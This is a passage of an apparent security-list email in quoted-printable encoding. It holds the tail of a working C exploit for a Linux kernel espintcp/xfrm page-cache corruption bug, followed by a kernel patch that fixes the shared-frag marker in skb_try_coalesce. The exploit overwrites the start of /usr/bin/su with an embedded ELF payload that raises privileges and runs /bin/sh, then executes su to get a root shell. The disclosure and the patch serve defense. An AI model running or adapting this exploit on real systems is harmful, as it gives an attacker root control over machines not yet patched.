	close(pipefd[1]);
	if (waitpid(tx, &st_tx, 0) < 0)
		die("wait sender");
	if (waitpid(rx, &st_rx, 0) < 0)
		die("wait receiver");

	printf("sender_status=3D%d receiver_status=3D%d\n", st_tx, st_rx);
	if (!WIFEXITED(st_tx) || WEXITSTATUS(st_tx) !=3D 0 ||
	    !WIFEXITED(st_rx) || WEXITSTATUS(st_rx) !=3D 0)
		return -1;
	return 0;
}

static uint64_t checked_byte_range_last(uint64_t byte_off, size_t byte_len)
{
	uint64_t n =3D (uint64_t)byte_len;

	if (n =3D=3D 0) {
		fprintf(stderr, "byte range is empty\n");
		exit(2);
	}
	if (n - 1 > UINT64_MAX - byte_off) {
		fprintf(stderr, "byte range overflows uint64_t\n");
		exit(2);
	}
	return byte_off + n - 1;
}

static void draw_smash_frame(const unsigned char *desired, size_t desired_l=
en,
			     const unsigned char *live, size_t idx_current,
			     size_t changed, size_t skipped, int first_draw)
{
	size_t done   =3D changed + skipped;
	size_t filled =3D desired_len ? done * FRAME_BAR_W / desired_len : FRAME_B=
AR_W;
	size_t row, col, bi, i;

	/* Save cursor, jump to row 1, buffer the whole frame into one write. */
	static char frame_buf[8192];
	setvbuf(stdout, frame_buf, _IOFBF, sizeof(frame_buf));
	if (!first_draw)
		printf("\033[s\033[?25l\033[1;1H");

	/* =E2=94=80=E2=94=80 header =E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=
=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=
=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=
=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=
=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=
=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=
=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80 */
	printf("\r\033[2K" C_BCYN "[*]" C_RESET
	       " smashing %zu bytes into read-only page cache"
	       "  changed=3D" C_BGRN "%zu" C_RESET
	       "  skipped=3D" C_DIM "%zu" C_RESET
	       "  remaining=3D" C_BYLW "%zu" C_RESET "\n",
	       desired_len, changed, skipped,
	       done < desired_len ? desired_len - done : (size_t)0);

	/* =E2=94=80=E2=94=80 hex dump =E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=
=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=
=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=
=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=
=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=
=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=
=94=80=E2=94=80=E2=94=80=E2=94=80 */
	for (row =3D 0; row < FRAME_PAYLOAD_ROWS; row++) {
		/* col-0 highlight borrows the header's last trailing space */
		int col0_hi =3D (idx_current < desired_len &&
			       row * 16 =3D=3D idx_current);
		printf("\r\033[2K" C_DIM "  %04zx%s" C_RESET,
		       row * 16, col0_hi ? " " : "  ");

		for (col =3D 0; col < 16; col++) {
			bi =3D row * 16 + col;
			int cur =3D (idx_current < desired_len && bi =3D=3D idx_current);

			if (col =3D=3D 8) {
				/* mid-gap space becomes '[' when col 8 is current */
				printf(cur ? "[" : " ");
				if (cur) {
					printf(C_BYLW "%02x]" C_RESET, live[bi]);
					continue;
				}
			}

			if (bi >=3D desired_len) { printf("   "); continue; }

			if (bi < idx_current) {
				printf(live[bi] =3D=3D desired[bi]
				       ? C_BGRN "%02x " C_RESET
				       : C_BRED "%02x " C_RESET, live[bi]);
			} else if (cur) {
				/* col 0: '[' was the header's borrowed space
				 * col 1-7, 9-15: '\b' eats the preceding byte's space */
				printf(col =3D=3D 0
				       ? C_BYLW "[%02x]" C_RESET
				       : "\b" C_BYLW "[%02x]" C_RESET, live[bi]);
			} else {
				printf(C_DIM "%02x " C_RESET, desired[bi]);
			}
		}
		printf("\n");
	}

	/* =E2=94=80=E2=94=80 progress bar =E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=
=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=
=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=
=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=
=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=
=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=
 */
	printf("\r\033[2K  [" C_BGRN);
	for (i =3D 0; i < filled; i++)          printf("=3D");
	printf(C_RESET C_DIM);
	for (i =3D filled; i < FRAME_BAR_W; i++) printf("-");
	printf(C_RESET "] " C_BWHT "%zu" C_RESET "/" C_DIM "%zu" C_RESET " (%zu%%)=
\n",
	       done, desired_len,
	       desired_len ? done * 100 / desired_len : (size_t)100);

	/* =E2=94=80=E2=94=80 separator =E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=
=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=
=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=
=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=
=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=
=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=
=94=80=E2=94=80=E2=94=80 */
	printf("\r\033[2K" C_DIM
	       "=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=
=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=
=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=
=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=
=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=
=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=
=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=94=80=E2=
=94=80=E2=94=80=E2=94=80"
	       C_RESET "\n");

	fflush(stdout);
	setvbuf(stdout, NULL, _IONBF, 0);
	if (!first_draw)
		printf("\033[?25h\033[u");  /* restore cursor to log area */
}

static int replace_existing_bytes_after(uint64_t byte_off,
					const unsigned char *desired,
					size_t desired_len,
					uint64_t file_size)
{
	uint64_t last =3D checked_byte_range_last(byte_off, desired_len);
	size_t idx, changed =3D 0, skipped =3D 0;
	unsigned char live_state[PAYLOAD_LEN];
	int fd_init;

	if (last >=3D file_size) {
		fprintf(stderr, "byte range outside target: offset=3D%llu len=3D%zu size=
=3D%llu\n",
			(unsigned long long)byte_off, desired_len,
			(unsigned long long)file_size);
		return 2;
	}
	if (last > file_size - FRAG_LEN) {
		fprintf(stderr,
			"collateral-after mode requires requested range end <=3D size-%d: offset=
=3D%llu len=3D%zu size=3D%llu\n",
			FRAG_LEN, (unsigned long long)byte_off, desired_len,
			(unsigned long long)file_size);
		return 2;
	}

	printf(C_BCYN "\n[*]" C_RESET
	       " timing: rx_pre_ulp=3D%uus tx_pre_splice=3D%uus rx_post_ulp=3D%uus=
\n",
	       RECEIVER_PRE_ULP_US, SENDER_PRE_SPLICE_US, RECEIVER_POST_ULP_US);
	printf(C_BCYN "[*]" C_RESET
	       " range: offset=3D0x%llx len=3D%zu last=3D0x%llx"
	       " enc_len=3D%d splice_len=3D%d\n",
	       (unsigned long long)byte_off, desired_len,
	       (unsigned long long)last, ESP_GCM_ENCRYPTED_LEN, FRAG_LEN);
	printf(C_BCYN "[*]" C_RESET
	       " union: transformed=3D0x%llx-0x%llx"
	       " collateral_after=3D0x%llx-0x%llx\n",
	       (unsigned long long)byte_off,
	       (unsigned long long)(last + ESP_GCM_ENCRYPTED_LEN - 1),
	       (unsigned long long)(last + 1),
	       (unsigned long long)(last + ESP_GCM_ENCRYPTED_LEN - 1));
	printf(C_BCYN "[*]" C_RESET " ");
	print_hex_bytes("payload", desired, desired_len);
	printf("\n");

	build_stream0_table();
	printf("\n");

	/* seed live_state from the file so the hex dump has real values */
	fd_init =3D open(target_file, O_RDONLY | O_CLOEXEC);
	if (fd_init < 0) die("open live_state init");
	if (pread(fd_init, live_state, desired_len, (off_t)byte_off) < (ssize_t)de=
sired_len)
		die("pread live_state init");
	close(fd_init);

	/* clear screen so the frame starts at a known row 1 */
	printf("\033[2J\033[H");
	draw_smash_frame(desired, desired_len, live_state, 0, 0, 0, 1);

	/* pin the frame to rows 1-FRAME_LINES; scroll region below */
	{
		struct winsize ws;
		int tr =3D 40;
		if (ioctl(STDOUT_FILENO, TIOCGWINSZ, &ws) =3D=3D 0 && ws.ws_row > FRAME_L=
INES)
			tr =3D (int)ws.ws_row;
		printf("\033[%d;%dr", FRAME_LINES + 1, tr);
		printf("\033[%d;1H", tr);  /* park cursor at bottom of scroll region */
		fflush(stdout);
	}

	for (idx =3D 0; idx < desired_len; idx++) {
		uint64_t off =3D byte_off + idx;
		unsigned char current, final, need_stream;

		live_state[idx] =3D read_byte_at(target_file, off);
		current =3D live_state[idx];

		draw_smash_frame(desired, desired_len, live_state, idx,
				 changed, skipped, 0);

		if (current =3D=3D desired[idx]) {
			printf(C_DIM "[-] [%zu/%zu] +%04llx already=3D%02x skip\n" C_RESET,
			       idx + 1, desired_len, (unsigned long long)off, current);
			skipped++;
			continue;
		}

		target_splice_off =3D (loff_t)off;
		need_stream =3D current ^ desired[idx];
		choose_iv_for_stream0(need_stream);
		active_esp_seq++;

		printf(C_BCYN "[*]" C_RESET " [%zu/%zu]"
		       " +%04llx  " C_RED "%02x" C_RESET " -> " C_BGRN "%02x" C_RESET
		       "  xor=3D" C_CYAN "%02x" C_RESET
		       " seq=3D" C_DIM "%u" C_RESET
		       " nonce=3D" C_DIM "%u" C_RESET "\n",
		       idx + 1, desired_len, (unsigned long long)off,
		       current, desired[idx], need_stream,
		       active_esp_seq, stream0_nonce[need_stream]);

/*
		printf(C_BCYN "[*]" C_RESET " before:\n");
		print_hex_row(target_file, off, "orig", current, "want", desired[idx]);

		printf(C_BCYN "[*]" C_RESET " iv=3D" C_CYAN);
		{
			size_t k;
			for (k =3D 0; k < sizeof(active_esp_gcm_iv); k++)
				printf("%02x", active_esp_gcm_iv[k]);
		}
*/
		printf(C_RESET " firing espintcp splice...\n");

		if (run_trigger_pair() < 0) {
			fprintf(stderr, C_BRED "[-] trigger pair failed at index=3D%zu\n" C_RESE=
T, idx);
			return 2;
		}

		final =3D read_byte_at(target_file, off);
		live_state[idx] =3D final;

/*
		printf(C_BCYN "[*]" C_RESET " after:\n");
		print_hex_row(target_file, off, "was", current, "now", final);
*/
		if (final =3D=3D desired[idx]) {
			printf(C_BGRN "[+]" C_RESET " smashed"
			       C_DIM " %02x -> %02x  index=3D%zu offset=3D+%04llx\n\n" C_RESET,
			       current, final, idx, (unsigned long long)off);
			changed++;
			continue;
		}
		if (final =3D=3D current) {
			printf(C_BGRN "[-]" C_RESET
			       " fixed behavior: byte unchanged at index=3D%zu offset=3D%llu\n",
			       idx, (unsigned long long)off);
			return 0;
		}
		printf(C_BRED "[-]" C_RESET
		       " BUG: byte changed but desired-value check mismatched"
		       " index=3D%zu offset=3D%llu desired=3D%02x got=3D%02x\n",
		       idx, (unsigned long long)off, desired[idx], final);
		return 1;
	}

	/* final frame: all bytes done, cursor past the end */
	draw_smash_frame(desired, desired_len, live_state, desired_len,
			 changed, skipped, 0);

	/* restore full scroll region and drop cursor below the frame */
	printf("\033[r\033[%d;1H\n", FRAME_LINES + 1);

	/* final verify pass */
	printf(C_BCYN "[*]" C_RESET " verifying %zu bytes...\n", desired_len);
	for (idx =3D 0; idx < desired_len; idx++) {
		uint64_t off =3D byte_off + idx;
		unsigned char final =3D read_byte_at(target_file, off);

		if (final !=3D desired[idx]) {
			printf(C_BRED "[-]" C_RESET
			       " BUG: final verify mismatch index=3D%zu offset=3D%llu desired=3D=
%02x got=3D%02x\n",
			       idx, (unsigned long long)off, desired[idx], final);
			return 1;
		}
	}

	printf(C_BCYN "[*]" C_RESET " bytes_flip_summary len=3D%zu changed=3D" C_B=
GRN "%zu" C_RESET
	       " skipped=3D" C_DIM "%zu" C_RESET "\n",
	       desired_len, changed, skipped);
	if (changed =3D=3D 0) {
		fprintf(stderr, "all requested bytes already had desired values\n");
		return 2;
	}

	printf(C_BGRN "[+]" C_RESET " BUG: changed requested copied byte range to =
desired values\n");
	return 1;
}

static void usage(const char *prog)
{
	fprintf(stderr, "usage: %s <target-file> <offset> <hex-bytes>\n", prog);
	fprintf(stderr, "example: %s /path/to/target 0 42434445\n", prog);
}

static const uint8_t shell_elf[PAYLOAD_LEN] =3D {
	0x7f,0x45,0x4c,0x46,0x02,0x01,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00=
,0x00,
	0x02,0x00,0x3e,0x00,0x01,0x00,0x00,0x00,0x78,0x00,0x40,0x00,0x00,0x00,0x00=
,0x00,
	0x40,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00=
,0x00,
	0x00,0x00,0x00,0x00,0x40,0x00,0x38,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00=
,0x00,
	0x01,0x00,0x00,0x00,0x05,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00=
,0x00,
	0x00,0x00,0x40,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x40,0x00,0x00,0x00,0x00=
,0x00,
	0xb8,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xb8,0x00,0x00,0x00,0x00,0x00,0x00=
,0x00,
	0x00,0x10,0x00,0x00,0x00,0x00,0x00,0x00,0x31,0xff,0x31,0xf6,0x31,0xc0,0xb0=
,0x6a,
	0x0f,0x05,0xb0,0x69,0x0f,0x05,0xb0,0x74,0x0f,0x05,0x6a,0x00,0x48,0x8d,0x05=
,0x12,
	0x00,0x00,0x00,0x50,0x48,0x89,0xe2,0x48,0x8d,0x3d,0x12,0x00,0x00,0x00,0x31=
,0xf6,
	0x6a,0x3b,0x58,0x0f,0x05,0x54,0x45,0x52,0x4d,0x3d,0x78,0x74,0x65,0x72,0x6d=
,0x00,
	0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00=
,0x00,
};

int main(int argc, char **argv)
{
	unsigned char *desired;
	uint64_t file_size, byte_off;
	size_t desired_len, sample_len;
	int ret;


	setvbuf(stdout, NULL, _IONBF, 0);

	printf(C_BCYN "[*]" C_RESET
	       " uid=3D" C_BWHT "%d" C_RESET
	       " euid=3D" C_BWHT "%d" C_RESET
	       " gid=3D" C_BWHT "%d" C_RESET
	       " egid=3D" C_BWHT "%d" C_RESET "\n",
	       getuid(), geteuid(), getgid(), getegid());
	printf(C_BCYN "[*]" C_RESET
	       " mode=3Dxfrm_espintcp_pagecache_replace collateral=3Dafter\n");
	printf("\n");

//        system("cp /bin/cat /tmp/test");
//        file_size =3D use_existing_target("/tmp/test");
        file_size =3D use_existing_target("/usr/bin/su");
	byte_off =3D 0;
	desired =3D (unsigned char *)shell_elf;
	desired_len =3D PAYLOAD_LEN;

	printf(C_BCYN "[*]" C_RESET " target=3D%s size=3D%llu\n",
	       target_file, (unsigned long long)file_size);
	verify_write_denied("outer");
	setup_user_netns_xfrm();
	verify_write_denied("userns_root_mapped_to_outer_user");

	ret =3D replace_existing_bytes_after(byte_off, desired, desired_len,
					   file_size);
	/* reset scroll region; some terminals home the cursor on \033[r so
	 * explicitly jump to the last row so PS1 lands below our output */
	write(STDOUT_FILENO, "\033[r\033[9999;1H\033[?25h\n", 19);
	execve("/usr/bin/su", NULL, NULL);
	return ret;
}

--=-=-=
Content-Type: text/x-patch
Content-Disposition: attachment;
 filename=0001-net-skbuff-preserve-shared-frag-marker-during-coales.patch
Content-Transfer-Encoding: quoted-printable

=46rom d260900c5c5cd8f858be0c3cc172df9b6fd11cec Mon Sep 17 00:00:00 2001
From: William Bowling <vakzz@zellic.io>
Date: Wed, 13 May 2026 04:16:35 +0000
Subject: [PATCH] net: skbuff: preserve shared-frag marker during coalescing

skb_try_coalesce() can attach paged frags from @from to @to.  If @from
has SKBFL_SHARED_FRAG set, the resulting @to skb can contain the same
externally-owned or page-cache-backed frags, but the shared-frag marker
is currently lost.

That breaks the invariant relied on by later in-place writers.  In
particular, ESP input checks skb_has_shared_frag() before deciding
whether an uncloned nonlinear skb can skip skb_cow_data().  If TCP
receive coalescing has moved shared frags into an unmarked skb, ESP can
see skb_has_shared_frag() as false and decrypt in place over page-cache
backed frags.

Propagate SKBFL_SHARED_FRAG when skb_try_coalesce() transfers paged
frags.  The tailroom copy path does not need the marker because it copies
bytes into @to's linear data rather than transferring frag descriptors.

Fixes: cef401de7be8 ("net: fix possible wrong checksum generation")
Fixes: f4c50a4034e6 ("xfrm: esp: avoid in-place decrypt on shared skb frags=
")
Signed-off-by: William Bowling <vakzz@zellic.io>
Reviewed-by: Eric Dumazet <edumazet@google.com>
---
 net/core/skbuff.c | 2 ++
 1 file changed, 2 insertions(+)

diff --git a/net/core/skbuff.c b/net/core/skbuff.c
index 7dad68e3b518..9c4e8d331d6d 100644
--- a/net/core/skbuff.c
+++ b/net/core/skbuff.c
@@ -6200,6 +6200,8 @@ bool skb_try_coalesce(struct sk_buff *to, struct sk_b=
uff *from,
 	       from_shinfo->frags,
 	       from_shinfo->nr_frags * sizeof(skb_frag_t));
 	to_shinfo->nr_frags +=3D from_shinfo->nr_frags;
+	if (from_shinfo->nr_frags)
+		to_shinfo->flags |=3D from_shinfo->flags & SKBFL_SHARED_FRAG;
=20
 	if (!skb_cloned(from))
 		from_shinfo->nr_frags =3D 0;

--=20
2.54.0

--=-=-=
Content-Type: text/plain


thanks,
sam

--=-=-=--

--==-=-=
Content-Type: application/pgp-signature; name="signature.asc"

-----BEGIN PGP SIGNATURE-----

iQEBBAEWCgCpFiEEJaa7iN2bdkxrVUHCc4QJ9SDfkZAFAmoEWZkbFIAAAAAABAAO
bWFudTIsMi41KzEuMTIsMiwyXxSAAAAAAC4AKGlzc3Vlci1mcHJAbm90YXRpb25z
Lm9wZW5wZ3AuZmlmdGhob3JzZW1hbi5uZXQyNUE2QkI4OEREOUI3NjRDNkI1NTQx
QzI3Mzg0MDlGNTIwREY5MTkwDxxzYW1AZ2VudG9vLm9yZwAKCRBzhAn1IN+RkKym
AQC3WuwT5M1E7SM78a1p/SgUXGRq8uccVQn2X73D7r+YiwD/eAPbB8AaMLi4IuMX
eEsXiZqSEf+ul2zQm0Bab0PbmQg=
=ku/7
-----END PGP SIGNATURE-----
--==-=-=--
